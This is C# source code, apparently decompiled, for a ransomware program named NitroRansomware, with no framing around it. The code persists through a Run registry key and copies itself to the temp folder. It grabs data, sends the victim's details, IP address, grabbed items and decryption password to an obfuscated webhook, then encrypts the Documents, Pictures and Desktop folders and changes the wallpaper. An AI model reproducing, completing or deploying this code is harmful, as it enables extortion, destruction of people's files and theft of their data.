using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class Program
{
	private static string desktop;

	private static string documents;

	private static string pictures;

	public static string WEBHOOK;

	public static string DECRYPT_PASSWORD;

	private static Logs logging;

	private static Webhook ww;

	private static void Main(string[] args)
	{
		if (Installed())
		{
			Application.Run((Form)(object)new Form1());
			return;
		}
		Duplicate();
		StartUp();
		Setup();
		EncryptAll();
		Temp();
		Thread.Sleep(6000);
		Application.Run((Form)(object)new Form1());
	}

	private static void Setup()
	{
		logging.Debug(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4176));
		List<string> list = Grabber.Grab();
		string text = "";
		foreach (string item in list)
		{
			text = text + item + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3916);
		}
		Console.WriteLine(text);
		List<string> details = User.GetDetails();
		string identifier = User.GetIdentifier();
		string iP = User.GetIP();
		Webhook webhook = new Webhook(WEBHOOK);
		webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4202) + details[0] + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4304) + details[1] + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4320) + identifier + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4338) + iP + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368));
		webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4378) + DECRYPT_PASSWORD + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368));
		webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4420) + text + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4368));
	}

	public static void EncryptAll()
	{
		ww.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4446));
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.EncryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
		ww.Send(string.Format(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4514), Crypto.encryptedFileLog.Count));
		Wallpaper.ChangeWallpaper();
	}

	public static void DecryptAll()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(documents);
		});
		Thread thread2 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(pictures);
		});
		Thread thread3 = new Thread((ThreadStart)delegate
		{
			Crypto.DecryptContent(desktop);
		});
		thread.Start();
		thread2.Start();
		thread3.Start();
		thread.Join();
		thread2.Join();
		thread3.Join();
	}

	private static void StartUp()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4674);
			string text2 = Path.GetTempPath() + text;
			Console.WriteLine(text2);
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4686), writable: true);
			registryKey.SetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4788) + text2 + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4788));
		}
		catch (Exception ex)
		{
			logging.Error(ex.Message);
		}
	}

	public static void RemoveStart()
	{
		if (Registry.GetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4794), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), true) != null)
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4686), writable: true))
			{
				registryKey.DeleteValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), throwOnMissingValue: false);
			}
		}
	}

	private static void Duplicate()
	{
		try
		{
			string text = Process.GetCurrentProcess().ProcessName + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4674);
			string sourceFileName = Path.Combine(Environment.CurrentDirectory, text);
			File.Copy(sourceFileName, Path.GetTempPath() + text);
			Console.WriteLine(Path.GetTempPath());
		}
		catch (Exception ex)
		{
			logging.Debug(ex.Message);
		}
	}

	private static bool Installed()
	{
		if (Registry.GetValue(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4794), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4780), null) != null)
		{
			return true;
		}
		return false;
	}

	private static void Temp()
	{
		string text = Path.GetTempPath() + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4926);
		Console.WriteLine(text);
		using StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine(DECRYPT_PASSWORD);
	}

	public Program()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
	}

	static Program()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		pictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		WEBHOOK = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4958);
		DECRYPT_PASSWORD = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5202);
		logging = new Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0);
		ww = new Webhook(WEBHOOK);
	}
}
